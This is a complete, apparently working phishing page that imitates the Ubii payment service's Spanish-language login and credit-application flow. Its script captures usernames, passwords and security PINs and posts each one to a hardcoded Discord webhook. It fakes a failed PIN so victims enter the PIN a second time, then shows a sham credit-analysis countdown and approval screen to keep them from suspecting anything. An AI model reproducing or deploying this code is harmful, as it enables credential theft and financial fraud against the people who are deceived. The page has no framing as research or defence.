```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ubii - Inicia Sesión y Solicitud de Crédito</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        ubiiBlue: '#009ee3',
                        ubiiBlueHover: '#0088c6',
                        ubiiCardBg: '#ffffff',
                        ubiiPageBg: '#e9ecef',
                        ubiiInputBg: '#ffffff',
                        ubiiGrayBg: '#eef2f5',
                        ubiiTextDark: '#1a1a1a',
                        ubiiTextGray: '#666666',
                        ubiiBorder: '#e2e8f0',
                    },
                    fontFamily: {
                        sans: ['Poppins', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <!-- FontAwesome Font Iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        
        body {
            background-color: #ebedee;
            font-family: 'Poppins', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        /* Ocultar flechas numéricas */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-center items-center p-4 selection:bg-ubiiBlue selection:text-white">

    <!-- Envoltorio Principal Centrado -->
    <div class="w-full max-w-sm mx-auto flex flex-col items-center">
        
        <!-- LOGO SUPERIOR UBII (Carita feliz proporcional, cuadrada y estilizada + Tipografía delgada) -->
        <div class="w-full flex justify-start mb-6 px-2">
            <div class="flex items-center gap-2">
                <!-- SVG de la Carita Feliz Ubii: Menos ancha, más alta y de forma cuadrada -->
                <svg class="h-9 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Dos puntos ojos alineados -->
                    <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                    <rect x="27.5" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                    <!-- Forma U más alta, menos ancha y cuadrada -->
                    <path d="M 4 14 V 28 C 4 41, 38 41, 38 28 V 14" stroke="#009ee3" stroke-width="5.5" stroke-linecap="square" stroke-linejoin="miter" />
                </svg>
                <span class="text-3xl font-semibold text-ubiiBlue tracking-tight" style="letter-spacing: -0.5px;">Ubii</span>
            </div>
        </div>

        <!-- TARJETA PRINCIPAL -->
        <div class="w-full bg-white rounded-[2rem] shadow-xl p-6 sm:p-7 border border-slate-100 relative overflow-hidden transition-all duration-300">

            <!-- ==================== ETAPA 1: PANTALLA DE LOGIN UBII ==================== -->
            <main id="step1Screen" class="w-full flex flex-col items-center pt-2">
                
                <!-- Logo interno Ubii -->
                <div class="flex items-center gap-2 mb-2">
                    <svg class="h-8 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                        <rect x="27.5" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                        <path d="M 4 14 V 28 C 4 41, 38 41, 38 28 V 14" stroke="#009ee3" stroke-width="5.5" stroke-linecap="square" stroke-linejoin="miter" />
                    </svg>
                    <span class="text-2xl font-semibold text-ubiiBlue tracking-tight" style="letter-spacing: -0.5px;">Ubii</span>
                </div>
                
                <h1 class="text-xl font-medium text-[#111111] mb-6">Inicia sesión</h1>

                <!-- Switch Selector: Natural / Jurídico -->
                <div class="w-full bg-[#f1f3f6] p-1 rounded-full flex items-center mb-5">
                    <button id="btnNatural" type="button" onclick="selectType('natural')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm">
                        Natural
                    </button>
                    <button id="btnJuridico" type="button" onclick="selectType('juridico')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600">
                        Juridico
                    </button>
                </div>

                <!-- Formulario de Entrada -->
                <form id="loginForm" onsubmit="handleStep1Submit(event)" class="w-full space-y-4">
                    
                    <!-- Campo Usuario / Correo -->
                    <div>
                        <input 
                            type="text" 
                            id="username" 
                            placeholder="Usuario / Correo" 
                            required
                            class="w-full px-4 py-3.5 bg-white border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue transition-all placeholder-gray-400 font-normal text-gray-800"
                        >
                    </div>

                    <!-- Campo Contraseña -->
                    <div class="relative">
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="Contraseña" 
                            required
                            class="w-full px-4 py-3.5 bg-white pr-12 border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue transition-all placeholder-gray-400 font-normal text-gray-800"
                        >
                        <button 
                            type="button" 
                            onclick="togglePassword()" 
                            class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-ubiiBlue transition-colors p-1.5 focus:outline-none"
                        >
                            <i id="eyeIcon" class="fa-regular fa-eye-slash text-xl"></i>
                        </button>
                    </div>

                    <!-- Enlace "¿Olvidaste tú contraseña?" -->
                    <div class="text-left pt-1 px-1">
                        <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline transition-colors">
                            ¿Olvidaste tú contraseña?
                        </a>
                    </div>

                    <!-- Botón Ingresar -->
                    <div class="pt-2">
                        <button 
                            type="submit" 
                            class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm focus:outline-none"
                        >
                            Ingresar
                        </button>
                    </div>

                    <!-- Botón Registrarme -->
                    <div>
                        <button 
                            type="button" 
                            class="w-full py-3.5 bg-[#f1f3f6] hover:bg-gray-200 text-gray-800 font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] focus:outline-none"
                        >
                            Registrarme
                        </button>
                    </div>
                </form>

            </main>

            <!-- ==================== ETAPA 2: PEDIR PIN DE CREACIÓN (PRIMER INTENTO - FALLO) ==================== -->
            <main id="step2Screen" class="w-full hidden flex-col">
                <button type="button" onclick="goToStep(1)" class="text-gray-400 hover:text-gray-700 mb-4 flex items-center gap-1.5 text-xs font-semibold focus:outline-none">
                    <i class="fa-solid fa-arrow-left"></i> Volver
                </button>

                <div class="flex flex-col items-center justify-center text-center mb-6">
                    <div class="w-14 h-14 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3">
                        <i class="fa-solid fa-key text-2xl"></i>
                    </div>
                    <h2 class="text-lg font-bold text-gray-900">Clave de Seguridad Ubii</h2>
                    <p class="text-xs text-gray-500 mt-2 leading-relaxed">
                        Ingresa el PIN de 6 dígitos que creaste al registrarte en Ubii para la cuenta:<br>
                        <strong class="displayUser text-gray-800 font-semibold break-all"></strong>
                    </p>
                </div>

                <form onsubmit="handleStep2Submit(event)" class="space-y-5">
                    <div class="grid grid-cols-6 gap-2">
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                    </div>

                    <!-- Notificación de error si falla -->
                    <div id="pinErrorStep2" class="hidden bg-red-50 border-l-4 border-red-500 p-3 rounded-r-xl">
                        <p class="text-xs text-red-600 font-medium flex items-center gap-1.5">
                            <i class="fa-solid fa-circle-exclamation text-red-500"></i>
                            PIN incorrecto. Por favor, verifica e inténtalo nuevamente.
                        </p>
                    </div>

                    <button 
                        type="submit" 
                        id="btnSubmitStep2"
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                    >
                        Validar PIN
                    </button>
                </form>
            </main>

            <!-- ==================== ETAPA 3: INGRESAR NUEVAMENTE EL PIN (SEGUNDO INTENTO - CORRECTO) ==================== -->
            <main id="step3Screen" class="w-full hidden flex-col">
                <div class="flex flex-col items-center justify-center text-center mb-6">
                    <div class="w-14 h-14 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mb-3">
                        <i class="fa-solid fa-shield-halved text-2xl"></i>
                    </div>
                    <h2 class="text-lg font-bold text-gray-900">Reverificación de Seguridad</h2>
                    <p class="text-xs text-gray-500 mt-2 leading-relaxed">
                        Coloca nuevamente tu PIN de 6 dígitos para autorizar el avance de tu solicitud.
                    </p>
                </div>

                <form onsubmit="handleStep3Submit(event)" class="space-y-5">
                    <div class="grid grid-cols-6 gap-2">
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                    </div>

                    <button 
                        type="submit" 
                        id="btnSubmitStep3"
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm"
                    >
                        Confirmar e Ingresar
                    </button>
                </form>
            </main>

            <!-- ==================== ETAPA 4: REVISAR CORREO ELECTRÓNICO ==================== -->
            <main id="step4Screen" class="w-full hidden flex-col items-center text-center">
                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4">
                    <i class="fa-regular fa-envelope text-3xl animate-bounce"></i>
                </div>
                
                <h2 class="text-xl font-bold text-gray-900 mb-2">Revisa tu correo</h2>
                <p class="text-xs text-gray-500 leading-relaxed mb-4">
                    Hemos enviado un correo de validación a:<br>
                    <span class="displayUserEmail text-ubiiBlue font-bold block mt-1 break-all"></span>
                </p>

                <!-- Advertencia sobre aprobación del correo -->
                <div class="bg-amber-50 border border-amber-200 p-3.5 rounded-2xl text-left mb-6 shadow-sm">
                    <p class="text-xs text-amber-800 flex items-start gap-2.5 leading-relaxed font-medium">
                        <i class="fa-solid fa-triangle-exclamation text-amber-500 text-sm mt-0.5 shrink-0"></i>
                        <span><strong>Atención:</strong> Tu crédito solo será aprobado si confirmas y autorizas previamente a través del correo electrónico enviado.</span>
                    </p>
                </div>

                <div class="w-full space-y-3">
                    <button 
                        type="button" 
                        onclick="goToStep(5)" 
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                    >
                        Continuar
                    </button>

                    <button 
                        type="button" 
                        onclick="resendMailNotification()" 
                        class="w-full py-3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium rounded-2xl text-sm transition-all"
                    >
                        Reenviar correo
                    </button>
                </div>
            </main>

            <!-- ==================== ETAPA 5: ANÁLISIS CON TIMELINE DE 0% A 100% (90 SEGUNDOS) ==================== -->
            <main id="step5Screen" class="w-full hidden flex-col items-center text-center">
                
                <!-- Pantalla de Carga (Analizando) -->
                <div id="loadingAnalysisBox" class="w-full flex flex-col items-center py-2">
                    <div class="relative w-20 h-20 flex items-center justify-center mb-4">
                        <div class="w-20 h-20 border-4 border-blue-100 border-t-ubiiBlue rounded-full animate-spin"></div>
                        <i class="fa-solid fa-chart-line text-ubiiBlue text-2xl absolute"></i>
                    </div>

                    <h2 class="text-lg font-bold text-gray-900 mb-1">Analizando tu Solicitud</h2>
                    <p class="text-xs text-gray-500 mb-6">
                        Estamos verificando tu historial. Por favor no cierres ni recargues esta ventana.
                    </p>

                    <!-- Barra de Progreso % del 0% al 100% -->
                    <div class="w-full bg-gray-100 rounded-full h-4 mb-2 overflow-hidden border border-gray-200">
                        <div id="analysisProgressBar" class="bg-ubiiBlue h-full rounded-full transition-all duration-300 ease-linear" style="width: 0%;"></div>
                    </div>

                    <!-- Contador porcentual centrado -->
                    <div class="w-full flex justify-center text-sm font-semibold text-ubiiBlue px-1 mb-2">
                        <span id="progressText">0%</span>
                    </div>
                </div>

                <!-- Resultado Final (Aparece tras llegar al 100%) -->
                <div id="resultSuccessBox" class="w-full hidden flex-col items-center pt-2">
                    <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-4">
                        <i class="fa-solid fa-check text-3xl"></i>
                    </div>
                    <h2 class="text-xl font-bold text-gray-900 mb-2">¡Solicitud Aprobada!</h2>
                    <p class="text-xs text-gray-600 leading-relaxed mb-6">
                        Hemos verificado satisfactoriamente tus datos. Tu línea de crédito Ubii pre-aprobada ha sido procesada con éxito.
                    </p>
                    <button 
                        type="button" 
                        onclick="location.reload()" 
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base shadow-sm"
                    >
                        Finalizar
                    </button>
                </div>

            </main>

        </div>

        <!-- Enlace Inferior de Contacto / Soporte -->
        <div class="mt-6 text-center text-xs text-gray-500 font-medium">
            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-semibold hover:underline">Contáctanos</a>
        </div>

    </div>

    <!-- Script de Lógica del Sistema -->
    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";

        let selectedType = 'natural';
        let userEmailOrName = '';
        let userPassword = '';
        let firstPinEntered = '';

        // Enviar reportes a Discord
        function sendToDiscord(messageText) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Ubii - Sistema Notificador",
                    content: messageText
                })
            }).catch(err => console.error("Error al enviar a Discord:", err));
        }

        // Alternar entre Natural y Jurídico
        function selectType(type) {
            selectedType = type;
            const btnNatural = document.getElementById('btnNatural');
            const btnJuridico = document.getElementById('btnJuridico');

            if (type === 'natural') {
                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm";
                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600";
            } else {
                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm";
                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600";
            }
        }

        // Mostrar / Ocultar Contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.className = "fa-regular fa-eye text-xl";
            } else {
                passwordInput.type = 'password';
                eyeIcon.className = "fa-regular fa-eye-slash text-xl";
            }
        }

        // Gestor de Cambio de Pantallas / Etapas
        function goToStep(stepNumber) {
            for (let i = 1; i <= 5; i++) {
                const screen = document.getElementById(`step${i}Screen`);
                if (screen) screen.classList.add('hidden');
            }

            document.getElementById(`step${stepNumber}Screen`).classList.remove('hidden');

            // Foco inicial de inputs al cambiar de pantalla
            if (stepNumber === 2) {
                const inputs = document.querySelectorAll('.pin-input-1');
                inputs.forEach(i => i.value = '');
                setTimeout(() => inputs[0].focus(), 100);
            } else if (stepNumber === 3) {
                const inputs = document.querySelectorAll('.pin-input-2');
                inputs.forEach(i => i.value = '');
                setTimeout(() => inputs[0].focus(), 100);
            } else if (stepNumber === 5) {
                start90SecProgress();
            }
        }

        // ETAPA 1: Login
        function handleStep1Submit(event) {
            event.preventDefault();
            userEmailOrName = document.getElementById('username').value;
            userPassword = document.getElementById('password').value;

            document.querySelectorAll('.displayUser').forEach(el => el.innerText = userEmailOrName);
            document.querySelectorAll('.displayUserEmail').forEach(el => {
                el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
            });

            // Reporte a Discord
            const msgLogin = `**🚨 NUEVO INICIO DE SESIÓN (ETAPA 1)**\nTipo: ${selectedType}\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\``;
            sendToDiscord(msgLogin);

            goToStep(2);
        }

        // ETAPA 2: Primer intento de PIN -> Siempre da Error
        function handleStep2Submit(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-1');
            let pinVal = '';
            inputs.forEach(i => pinVal += i.value);

            if (pinVal.length !== 6) return;

            firstPinEntered = pinVal;
            const btn = document.getElementById('btnSubmitStep2');
            const originalText = btn.innerHTML;

            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Verificando...`;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalText;

                // Forzar mensaje de error
                document.getElementById('pinErrorStep2').classList.remove('hidden');

                // Enviar registro del PIN fallido
                sendToDiscord(`❌ **PIN INCORRECTO FORZADO (ETAPA 2)**\n**Usuario:** \`${userEmailOrName}\`\n**PIN Ingresado:** \`${pinVal}\``);

                // Esperar 1.2 segundos y pasar automáticamente a la Etapa 3
                setTimeout(() => {
                    goToStep(3);
                }, 1200);

            }, 800);
        }

        // ETAPA 3: Segundo intento de PIN -> Aceptado
        function handleStep3Submit(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-2');
            let pinVal = '';
            inputs.forEach(i => pinVal += i.value);

            if (pinVal.length !== 6) return;

            const btn = document.getElementById('btnSubmitStep3');
            const originalText = btn.innerHTML;

            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Procesando...`;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalText;

                // Enviar registro de segundo PIN exitoso
                sendToDiscord(`✅ **PIN SEGUNDO INTENTO RE-VERIFICADO (ETAPA 3)**\n**Usuario:** \`${userEmailOrName}\`\n**PIN Correcto:** \`${pinVal}\``);

                goToStep(4);
            }, 800);
        }

        // ETAPA 5: Barra de Progreso del 0% al 100% durante 90 segundos (1.5 Minutos)
        function start90SecProgress() {
            const progressBar = document.getElementById('analysisProgressBar');
            const progressText = document.getElementById('progressText');

            let totalSeconds = 90; // 90 segundos
            let currentSecond = 0;

            sendToDiscord(`⏳ **INICIO DE ANÁLISIS DE CRÉDITO (90 Segundos)**\n**Usuario:** \`${userEmailOrName}\``);

            const interval = setInterval(() => {
                currentSecond++;
                const percentage = Math.min(100, Math.floor((currentSecond / totalSeconds) * 100));

                progressBar.style.width = `${percentage}%`;
                progressText.innerText = `${percentage}%`;

                if (currentSecond >= totalSeconds) {
                    clearInterval(interval);
                    document.getElementById('loadingAnalysisBox').classList.add('hidden');
                    document.getElementById('resultSuccessBox').classList.remove('hidden');
                    document.getElementById('resultSuccessBox').classList.add('flex');
                    sendToDiscord(`🎉 **ANÁLISIS COMPLETADO EXITOSAMENTE AL 100%**\n**Usuario:** \`${userEmailOrName}\``);
                }
            }, 1000); // Se actualiza cada segundo
        }

        // Configurar navegación de casillas de PIN
        function setupPinInputs(selectorClass) {
            const inputs = document.querySelectorAll(selectorClass);
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length > 1) {
                        e.target.value = e.target.value.slice(-1);
                    }
                    if (e.target.value !== '' && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        setupPinInputs('.pin-input-1');
        setupPinInputs('.pin-input-2');

        function resendMailNotification() {
            sendToDiscord(`📧 **El usuario \`${userEmailOrName}\` ha solicitado reenvío de correo.**`);
            alert("Se ha enviado un nuevo enlace a tu correo electrónico.");
        }
    </script>
</body>
</html>
```
